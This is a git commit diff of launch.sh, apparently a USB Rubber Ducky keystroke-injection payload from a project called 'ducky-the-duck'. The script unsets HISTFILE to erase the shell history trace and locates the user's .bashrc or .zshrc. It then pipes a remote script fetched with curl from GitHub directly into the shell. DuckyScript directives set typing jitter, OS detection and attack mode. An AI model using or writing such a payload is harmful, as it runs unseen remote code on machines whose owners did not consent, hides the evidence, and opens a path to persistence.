c826b5313dc65afd153999aa8f48bbe4bf6c3856
Xavier Mitault <xavier.mitault@epitech.eu>
2024-06-15 12:04:00 +0200

    Update launch.sh

--- launch.sh
+++ launch.sh
@@ -4,10 +4,12 @@
 # AUTHOR Saverio976
 # DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck
 
-#!EXTENSION!detect_ready.txt
+# !EXTENSION!detect_ready.txt
+# !EXTENSION!os_detect.txt
 
-#!DUCKY!$_JITTER_ENABLED = TRUE
-#!DUCKY!$_JITTER_MAX = 1
+# !DUCKY!$_JITTER_ENABLED = TRUE
+# !DUCKY!$_JITTER_MAX = 1
+# !DUCKY!DETECT_OS()
 
 unset HISTFILE
 
@@ -17,13 +19,10 @@ CURRENTSHELL=$(readlink /proc/$$/exe)
 $CURRENTSHELL
 unset HISTFILE
 
-[[ "$CURRENTSHELL" == *"zsh"* ]] && CURRENTSHELL="zsh"
-[[ "$CURRENTSHELL" == *"bash"* ]] && CURRENTSHELL="bash"
-
 export CONFIGFILE=''
-[ "$CURRENTSHELL" = "zsh" ] && CONFIGFILE="${ZDOTDIR:-$HOME}/.zshrc"
-[ "$CURRENTSHELL" = "bash" ] && CONFIGFILE="$HOME/.bashrc"
+[[ "$CURRENTSHELL" == *"zsh"* ]] && CURRENTSHELL="zsh" && CONFIGFILE="${ZDOTDIR:-$HOME}/.zshrc"
+[[ "$CURRENTSHELL" == *"bash"* ]] && CURRENTSHELL="bash" && CONFIGFILE="$HOME/.bashrc"
 
 curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENTSHELL
 
-#!DUCKY!ATTACKMODE STORAGE
+# !DUCKY!ATTACKMODE STORAGE
